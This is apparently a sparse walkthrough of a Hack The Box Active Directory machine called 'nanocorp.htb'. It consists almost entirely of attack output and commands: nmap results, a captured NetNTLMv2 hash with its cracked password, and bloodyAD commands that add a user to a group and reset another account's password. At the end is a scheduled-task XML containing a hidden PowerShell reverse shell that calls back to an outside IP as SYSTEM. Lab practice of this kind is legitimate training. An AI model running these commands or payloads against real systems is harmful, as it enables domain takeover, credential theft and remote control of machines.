---
tags:
  - Active_Directory
  - HTB
---

we will start with nmap:
```
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http              syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-09 02:08:46Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```



```
web_svc::NANOCORP:ff28bb0ed733847d:B96DB0D814F1D98AA87E453119781668:010100000000000000DED6D30651DC01938855A374394B70000000000200080059004F0048005A0001001E00570049004E002D004B00490044004800530047005500320049005200510004003400570049004E002D004B0049004400480053004700550032004900520051002E0059004F0048005A002E004C004F00430041004C000300140059004F0048005A002E004C004F00430041004C000500140059004F0048005A002E004C004F00430041004C000700080000DED6D30651DC0106000400020000000800300030000000000000000000000000200000190573EC30688B702D56515C5F0B7105EE1CDB3B0F1A90B184D425E88294693B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340033000000000000000000

WEB_SVC::NANOCORP:ff28bb0ed733847d:b96db0d814f1d98aa87e453119781668:010100000000000000ded6d30651dc01938855a374394b70000000000200080059004f0048005a0001001e00570049004e002d004b004900440048005300470
05500320049005200510004003400570049004e002d004b0049004400480053004700550032004900520051002e0059004f0048005a002e004c004f00430041004c000300140059004f0048005a002e004c004f00430041004c000500140059004f0048005a002e004c004f00430041004c000700080000ded6d30651dc0106000400020000000800300030000000000000000000000000200000190573ec30688b702d56515c5f0b7105ee1cdb3b0f1a90b184d425e88294693b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200340033000000000000000000:dksehdgh712!@#
```

```
WEB_SVC : dksehdgh712!@#
```

```sh
web_svc
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" add groupMember 'IT_Support' 'web_svc'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" set password 'monitoring_svc' 'dksehdgh712!@#'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" get writable



```

```
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
```


```
sudo virsh net-destroy default
```

```
$xml = @' 2025-11-08T00:00:00 web_svc 2025-11-08T12:00:00 true 1 S-1-5-18 HighestAvailable IgnoreNew false false true true false true false true true false false false PT0S 4 powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.243',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" '@ $xml | Out-File -FilePath "C:\Windows\System32\Tasks\Exploit" -Encoding Unicode
```